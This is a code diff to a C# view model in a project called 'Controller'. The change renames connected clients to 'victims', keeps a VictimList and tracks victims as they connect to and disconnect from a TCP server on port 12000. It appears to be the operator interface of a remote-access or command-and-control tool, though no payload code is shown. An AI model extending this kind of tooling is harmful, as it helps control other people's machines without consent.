@@ -1,6 +1,6 @@
-﻿using Controller.Helpers;
-using Controller.Models;
+﻿using Controller.Models;
 using Controller.Services;
+using System.Collections.ObjectModel;
 using System.Diagnostics;
 
 namespace Controller.ViewModels.Pages
@@ -12,19 +12,42 @@ namespace Controller.ViewModels.Pages
         [ObservableProperty]
         private string _status = "Start Server";
 
+        [ObservableProperty]
+        private ObservableCollection<Victim> _victimList = [];
+
         [RelayCommand]
         private void OnToggleServer() {
             Status = (_isRunning ? "Start" : "Stop") + " Server";
             
             UDPService.ToggleUDPService(null);
-            
-            if (!_isRunning) TCPService.Start(12000, MessageHandler);
-            else TCPService.Stop();
+
+            if (!_isRunning)
+            {
+                TCPService.Start(12000, MessageHandler);
+                TCPService.OnVictimConnected += OnVictimConnected;
+                TCPService.OnVictimDisconnected += OnVictimDisconnected;
+            }
+            else
+            {
+                TCPService.Stop();
+                TCPService.OnVictimConnected -= OnVictimConnected;
+                TCPService.OnVictimDisconnected -= OnVictimDisconnected;
+            }
 
             _isRunning = !_isRunning;
         }
 
-        private static Task MessageHandler(IClient client, string messageType, object payload)
+        private void OnVictimDisconnected(Victim victim)
+        {
+            VictimList?.Remove(victim);
+        }
+
+        private void OnVictimConnected(Victim victim)
+        {
+            VictimList?.Add(victim);
+        }
+
+        private static Task MessageHandler(IVictim victim, string messageType, object payload)
         {
             switch (messageType.ToLower())
             {
